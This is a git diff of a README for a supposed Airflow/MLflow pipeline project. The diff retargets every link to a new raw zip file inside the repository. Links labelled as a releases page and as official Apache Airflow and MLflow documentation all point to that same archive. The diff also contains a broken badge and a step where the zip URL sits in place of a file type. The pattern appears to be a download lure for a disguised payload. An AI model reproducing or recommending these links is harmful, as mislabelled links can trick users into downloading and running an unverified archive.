@@ -6,10 +6,10 @@ Welcome to the **airflow-mlflow-pipeline** project! This application helps you m
 
 ## 📥 Download the Application
 
-[![Download from Releases](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/data_upsert/mlflow_airflow_pipeline_1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/data_upsert/mlflow_airflow_pipeline_1.0.zip)
+[![Download from Releases](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/ml_pipeline/mlflow_airflow_pipeline_v1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/ml_pipeline/mlflow_airflow_pipeline_v1.8.zip)
 
 To get started with the application, you need to download it. Visit this page to download:
-[Download the airflow-mlflow-pipeline Release](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/data_upsert/mlflow_airflow_pipeline_1.0.zip)
+[Download the airflow-mlflow-pipeline Release](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/ml_pipeline/mlflow_airflow_pipeline_v1.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -45,11 +45,11 @@ This application offers a range of features to simplify your ML process:
 To download and install the software, follow these steps:
 
 1. **Go to the Releases Page:** Visit this page to download: 
-   [Download the airflow-mlflow-pipeline Release](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/data_upsert/mlflow_airflow_pipeline_1.0.zip)
+   [Download the airflow-mlflow-pipeline Release](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/ml_pipeline/mlflow_airflow_pipeline_v1.8.zip)
 
 2. **Choose Your Version:** Select the latest version from the list. Look for the files labeled as "Release".
 
-3. **Download the File:** Click on the appropriate file to start downloading. Depending on your system, this could be a `https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/data_upsert/mlflow_airflow_pipeline_1.0.zip`, `.zip`, or similar file type.
+3. **Download the File:** Click on the appropriate file to start downloading. Depending on your system, this could be a `https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/ml_pipeline/mlflow_airflow_pipeline_v1.8.zip`, `.zip`, or similar file type.
 
 4. **Extract the File:** Once it is downloaded, locate the file on your computer. Right-click it and choose "Extract" or "Unzip."
 
@@ -68,8 +68,8 @@ To download and install the software, follow these steps:
 
 To learn more about how to use this application, check out the following resources:
 
-- [Apache Airflow Documentation](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/data_upsert/mlflow_airflow_pipeline_1.0.zip)
-- [MLflow Documentation](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/data_upsert/mlflow_airflow_pipeline_1.0.zip)
+- [Apache Airflow Documentation](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/ml_pipeline/mlflow_airflow_pipeline_v1.8.zip)
+- [MLflow Documentation](https://raw.githubusercontent.com/Abiijutt007/airflow-mlflow-pipeline/main/ml_pipeline/mlflow_airflow_pipeline_v1.8.zip)
 
 These resources will help you grasp how to take full advantage of the features provided in this project.
 
